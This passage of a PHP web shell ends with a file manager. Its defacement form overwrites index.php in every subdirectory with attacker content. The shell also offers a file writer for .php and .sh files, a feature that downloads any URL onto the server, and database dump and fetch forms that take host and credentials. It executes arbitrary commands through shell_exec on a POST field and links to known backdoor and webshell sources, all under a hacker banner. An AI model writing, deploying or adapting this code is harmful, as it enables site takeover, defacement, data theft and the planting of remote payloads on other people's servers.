farbbibliothek[1] = new Array('#00FF00','#000000','#00FF00','#00FF00');
 
farbbibliothek[2] = new Array('#00FF00','#FF0000','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00','#00FF00');
 
farbbibliothek[3] = new Array('#FF0000','#FF4000','#FF8000','#FFC000','#FFFF00','#C0FF00','#80FF00','#40FF00','#00FF00','#00FF40','#00FF80','#00FFC0','#00FFFF','#00C0FF','#0080FF','#0040FF','#0000FF','#4000FF','#8000FF','#C000FF','#FF00FF','#FF00C0','#FF0080','#FF0040');
 
farbbibliothek[4] = new Array('#FF0000','#EE0000','#DD0000','#CC0000','#BB0000','#AA0000','#990000','#880000','#770000','#660000','#550000','#440000','#330000','#220000','#110000','#000000','#110000','#220000','#330000','#440000','#550000','#660000','#770000','#880000','#990000','#AA0000','#BB0000','#CC0000','#DD0000','#EE0000');
 
farbbibliothek[5] = new Array('#000000','#000000','#000000','#FFFFFF','#FFFFFF','#FFFFFF');
 
farbbibliothek[6] = new Array('#0000FF','#FFFF00');
 
farben = farbbibliothek[4];

function farbschrift() 
{ 
for(var i=0 ;
 i<Buchstabe.length;
 i++) 
{ 
document.all['a'+i].style.color=farben[i];
 
} 
farbverlauf();
 
} 
function string2array(text) 
{ 
Buchstabe = new Array();
 
while(farben.length<text.length) 
{ 
farben = farben.concat(farben);
 
} 
k=0;
 
while(k<=text.length) 
{ 
Buchstabe[k] = text.charAt(k);
 
k++;
 
} 
} 
function divserzeugen() 
{ 
for(var i=0 ;
 i<Buchstabe.length;
 i++) 
{ 
document.write('<span id='a'+i+'' class='a'+i+''>'+Buchstabe[i] + '</span>');
 
} 
farbschrift();
 
} 
var a=1;
 
function farbverlauf() 
{ 
for(var i=0 ;
 i<farben.length;
 i++) 
{ 
farben[i-1]=farben[i];
 
} 
farben[farben.length-1]=farben[-1];
 
 
setTimeout('farbschrift()',30);
 
} 
// Zu Demonstrationszwecken***************** 
var farbsatz=1;
 
function farbtauscher() 
{ 
farben = farbbibliothek[farbsatz];
 
while(farben.length<text.length) 
{ 
farben = farben.concat(farben);
 
} 
farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
 
} 
setInterval('farbtauscher()',4500);
 
text= ' World Saviors ';
 
//h 
string2array(text);

divserzeugen();
 
//document.write(text);
 

</script>
<br>
<br>
<hr width='1000px' style='color:green'>
<center> 
<font color='white'>Ruling The World From My Table</font>
<hr>
<font color='white'>Fucking The World For Fun</font>
</center>
</font></h1></td></table> </div> 
</body>
 <audio autoplay='true' src='https://dl.jatt.link/cdn1.jatt.link/0c74723573bad0b59e8039120d801e6d/utpkv/Kali%20Denali%20Bohemia-(Mr-Jatt.com).mp3' <audio>
 </html>" 
?>

<hr color='lime'>
<form method='POST'>
<font color='lime'>Target Folder</font>
<br>
<input class="form-control" type='text' style='color:lime;
background-color:#000000' name='base_dir' value='
<?php echo getcwd();
 
?>'>
<br><br>
<font color='black'>Name of File</font>
<br>
<input cols='10' rows='10' type='text' style='color:lime;
background-color:#000000' name='andela' value='index.php'>
<br>
<font color='black'>Script Deface</font>
<br>
<textarea class="form-control" style='color:lime;
background-color:#000000;
background-image:url(http://ac-team.ml/bg.jpg);
' name='index'>

<?php echo $deface ;
 
?></textarea>
<br>
<input type='submit' class="form-control" value='Execute Attack'>
</form>
<hr color='lime'>

 
<?php if (isset ($_POST['base_dir'])) { if (!file_exists ($_POST['base_dir'])) die ($_POST['base_dir']." Not Found !<br>");
 if (!is_dir ($_POST['base_dir'])) die ($_POST['base_dir']." Is Not A Directory !<br>");
 @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 foreach ($files as $file): if ($file != "." && $file != ".." && @filetype ($file) == "dir") { $index = getcwd ()."/".$file."/".$_POST['andela'];
 if (file_put_contents ($index, $_POST['index'])) echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;
)</font>";
 } endforeach;
 } 
?>
</div></center>
<!-- defacement code ends here -->

<!-- write the files box start here-->
<center>
<div id="myDIV" style="display: none;
 width: 80%;
"><hr><div class="topnav" style="background-color: black;
">
 <a target="_blank" href="http://git.kali.org/gitweb/?p=packages/webshells.git;
a=blob_plain;
f=php/qsd-php-backdoor.php;
hb=7aea183cdb19b1bcef0e667096826eee37e15262"><b>[ bash.php ]</b></a> 
 <a target="_blank" href="https://github.com/tennc/webshell/blob/master/web-malware-collection-13-06-2012/ASP/cmd.asp"><b>[ bash.asp ]</b></a>
 <a target="_blank" href="https://raw.githubusercontent.com/A-Aerro/php-webshell/master/dbdump.php"><b>[ dbdump.php ]</b></a>
 </div>
<hr>
 <form method="post">
 <div class="write-l">
 <p style="display: inline;
">FILE NAME : </p><input type="text" class="form-control" style="width: 17%;
 display: inline;
" name="file"/>
 
 <p style="display: inline;
">FILE EXTENSION :</p> <select name="ext" style="width: 17%;
 display: inline;
" class="form-control" >
 <option value="">Extension</option>
 <option>.html</option>
 <option>.js</option>
 <option>.css</option>
 <option>.php</option>
 <option>.asp</option>
 <option>.bat</option>
 <option>.sh</option>
 <option>.ini</option>
 <option>.txt</option>
 </select> 
 </div>
 <div class="write-r">
 <hr color="black">
 <b><h2> Enter your contents </h2></b> <BR/> <textarea style="border: 1px;
 width: 80%;
" rows="10" name="data">
<?php echo @$contents ;
 
?></textarea>
 
 <br/><center><div style="border: 1px;
 width: 80%;
 display: block;
 background: black;
 color: lime;
 padding: 2px;
 " ><input type="submit" class="btn btn-info" value="Save" name="save"/></div></center>
 </div>
 </form>

</div></center> 
<!-- write form ends here -->

<!-- download from url starts here -->
 <center>
<div id="myfd" style=" width: 80%;
 display:none;
">
<hr>
<div id="wrapper">
<h1 style="width: 70%;
margin-top: 1%;
 color: lime;
 "> Download a file from any URL</h1><br />
<h1 style="width: 70%;
margin-top: 1%;
 color: red;
 ">To 
<?php echo getcwd();
 
?> </h1>
<form method="post" style="width: 70%;
margin: auto;
">
<input name="url" size="50" placeholder="Source URL" style="width: 100%;
height: 10%;
font-size: 1.5em;
" required><br><br>
<input name="uplink" type="submit" value="Download" style="width: 30%;
height: 10%;
font-size: 1.5em;
 display: block;
">

</form>

<?php if (isset($_POST['uplink'])){ $destination_folder = '';
 $url = $_POST['url'];
 $newfname = $destination_folder . basename($url);
 file_put_contents( $newfname, fopen($url, 'r'));
 echo"<script>alert(' File Successfully Uploaded')</script>";
 } 
?>


<hr>
</div></div></center>
 
<!-- download from url ends here -->

<!-- file manager starts here -->
<center>
<div id="myFM" style=" width: 80%;
">

<!-- file manager start here -->
<hr>
<div id="wrapper">

<?php } function fm_show_footer() { 
?>
</div>

<script>
function edit_save(i,atr){var contents=(atr=="ace")?editor.getSession().getValue():document.getElementById('normal-editor').value;
if(!!contents){var form=document.createElement("form");
form.setAttribute("method", 'POST');
form.setAttribute("action", '');
var inputField=document.createElement("textarea");
inputField.setAttribute("type", "textarea");
inputField.setAttribute("name", 'savedata');
var _temp=document.createTextNode(contents);
inputField.appendChild(_temp);
form.appendChild(inputField);
document.body.appendChild(form);
form.submit();
}}
function newfolder(p){var n=prompt('New folder name','folder');
if(n!==null&&n!==''){window.location.search='p='+encodeURIComponent(p)+'&new='+encodeURIComponent(n);
}}
function rename(p,f){var n=prompt('New name',f);
if(n!==null&&n!==''&&n!=f){window.location.search='p='+encodeURIComponent(p)+'&ren='+encodeURIComponent(f)+'&to='+encodeURIComponent(n);
}}
function change_checkboxes(l,v){for(var i=l.length-1;
i>=0;
i--){l[i].checked=(typeof v==='boolean')?v:!l[i].checked;
}}
function get_checkboxes(){var i=document.getElementsByName('file[]'),a=[];
for(var j=i.length-1;
j>=0;
j--){if(i[j].type='checkbox'){a.push(i[j]);
}}return a;
}
function select_all(){var l=get_checkboxes();
change_checkboxes(l,true);
}
function unselect_all(){var l=get_checkboxes();
change_checkboxes(l,false);
}
function invert_all(){var l=get_checkboxes();
change_checkboxes(l);
}
function checkbox_toggle(){var l=get_checkboxes();
l.push(this);
change_checkboxes(l);
}
</script>

<?php if (isset($_GET['view']) && FM_USE_HIGHLIGHTJS): 
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.2.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();
</script>

<?php endif;
 
?>
<hr>
</div>
 </center>
<!-- file manager ends here -->

<div id="myDBM" style="display: none;
 color: lime;
" >
<center>

<div style="width: 30%;
 display: inline-block;
" class="floating-box" id="myddm">
<hr><h2>Dump Database</h2><hr>
 <form method="post" action="dbdump.php">
 <input style="width: 80% " type="text" class="form-control" name="host" placeholder="HOST" required="" ><br>
 <input style=" width: 80%" class="form-control" type="text" name="dbname" placeholder="DATABASE NAME" required="" ><br>
 <input style=" width: 80%" class="form-control" type="text" name="dbid" placeholder="DATABASE username" required=""><br>
 <input style=" width: 80%" class="form-control" type="text" name="dbpass" placeholder="DATABASE Password" ><br>
 <input style=" width: 50%" class="btn btn-info" type="submit" name="show_tables" value="Dump db"><br>
 </form><br>_
 </div>
<br><div style="width: 30%;
 display: inline-block;
 " class="floating-box" id="mydfm">
<hr><h2>Fetch Database</h2><hr>
 <form method="post">

 <input style=" width: 80%" type="text" class="form-control" name="host" placeholder="HOST" required="" ><br>
 <input style=" width: 80%" type="text" class="form-control" name="dbname" placeholder="DATABASE NAME" required="" ><br>
 <input style=" width: 80%" type="text" class="form-control" name="dbid" placeholder="DATABASE username" required=""><br>
 <input style=" width: 80%" type="text" class="form-control" name="dbpass" placeholder="DATABASE PASS" ><br>
 <input style=" width: 80%" type="text" class="form-control" name="clm" placeholder="coloum name" ><br>
 <input style=" width: 80%" type="text" class="form-control" name="row" placeholder="row name" ><br>
 <input style=" width: 50%;
" type="submit" class="btn btn-info" name="show_tables"><br>
 </form><br>_
</div>
<br>
</center>

 
<?php function uploaded(){ if(isset($_POST['show_tables'])){ $dbname=$_POST['dbname'];
 $dbid=$_POST['dbid'];
 $dbpass=$_POST['dbpass'];
 $host=$_POST['host'];
 $con = new PDO("mysql:host=".$host.";
dbname=".$dbname.";
charset=utf8", $dbid, $dbpass);
 echo"<h3 style=color:red;
>TABLES<h3>";
 $alltables=$con->query("SHOW TABLES",PDO::FETCH_NUM);
 while($result=$alltables->fetch()){ echo $result[0] .'<br/>';
 } if(!empty($_POST['clm'])){ echo "<div style='color:red;
 margin-left:30%;
 margin-top:-10%;
'>";
echo $colom=$_POST['clm'];
 echo "<br>";
 $rs = $con->query("SELECT * FROM ".$colom." LIMIT 0");
 for ($i = 0;
 $i < $rs->columnCount();
 $i++) { $col = $rs->getColumnMeta($i);
 $columns[] = $col['name'];
 } echo"<br>";
 $i=1;
 foreach ($columns as $key ) { echo " <div style='color:blue;
'>".$i++."&nbsp;
".$key."</div><br>";
 } } else{echo "<p style='color :red'>Enter coloum name to show data of colom<p>";
} ;
echo"</div>";
 if(!empty($_POST['row'] && $_POST['clm']) ){ echo "<div style='color:red;
 margin-left:60%;
 margin-top:-90%;
'>";
echo $colom=$_POST['clm'];
 $rows=$_POST['row'];
 echo "<br>";
 $fetch_cat=$con->prepare("SELECT * FROM ".$colom." ORDER BY 1 DESC ");
 $fetch_cat->setFetchMode(PDO:: FETCH_ASSOC);
 $fetch_cat->execute();
 while($row_cat=$fetch_cat->fetch()){ echo $row_cat[$rows];
 echo"<br>";
 }}else{echo "<p style='color :red;
 font-size: 40px!important;
'>Enter coloum name and row name to show data of row<p>";
} ;
echo"</div>";
 } } uploaded();
 
?>

</div>


</center>

<?php if (isset($_POST['cmd'])) { $output = shell_exec($_POST['cmd']);
 echo "<pre style='color:lime;
'>".$output."</pre>";
 } 
?>
</center>
<hr>
</div>

</div>
</body>
</html>








<!-- file manager php code begins here -->

<?php } function fm_show_image($img) { $modified_time = gmdate('D, d M Y 00:00:00') . ' GMT';
 $expires_time = gmdate('D, d M Y 00:00:00', strtotime('+1 day')) . ' GMT';
 $img = trim($img);
 $images = fm_get_images();
 $image = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAEElEQVR42mL4//8/A0CAAQAI/AL+26JNFgAAAABJRU5ErkJggg==';
 if (isset($images[$img])) { $image = $images[$img];
 } $image = base64_decode($image);
 if (function_exists('mb_strlen')) { $size = mb_strlen($image, '8bit');
 } else { $size = strlen($image);
 } if (function_exists('header_remove')) { header_remove('Cache-Control');
 header_remove('Pragma');
 } else { header('Cache-Control:');
 header('Pragma:');
 } header('Last-Modified: ' . $modified_time, true, 200);
 header('Expires: ' . $expires_time);
 header('Content-Length: ' . $size);
 header('Content-Type: image/png');
 echo $image;
 exit;
 } function fm_get_images() { return array( 'favicon' => 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJ
bWFnZVJlYWR5ccllPAAAAZVJREFUeNqkk79Lw0AUx1+uidTQim4Waxfpnl1BcHMR6uLkIF0cpYOI
f4KbOFcRwbGTc0HQSVQQXCqlFIXgFkhIyvWS870LaaPYH9CDy8vdfb+fey930aSUMEvT6VHVzw8x
rKUX3N3Hj/8M+cZ6GcOtBPl6KY5iAA7KJzfVWrfbhUKhALZtQ6myDf1+X5nsuzjLUmUOnpa+v5r1
Z4ZDDfsLiwER45xDEATgOI6KntfDd091GidzC8vZ4vH1QQ09+4MSMAMWRREKPMhmsyr6voYmrnb2
PKEizdEabUaeFCDKCCHAdV0wTVNFznMgpVqGlZ2cipzHGtKSZwCIZJgJwxB38KHT6Sjx21V75Jcn
LXmGAKTRpGVZUx2dAqQzSEqw9kqwuGqONTufPrw37D8lQFxCvjgPXIixANLEGfwuQacMOC4kZz+q
GdhJS550BjpRCdCbAJCMJRkMASEIg+4Bxz4JwAwDSEueAYDLIM+QrOk6GHiRxjXSkJY8KUCvdXZ6
kbuvNx+mOcbN9taGBlpLAWf9nX8EGADoCfqkKWV/cgAAAABJRU5ErkJggg==', 'sprites' => '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
RK5CYII=', );
 } 
?>
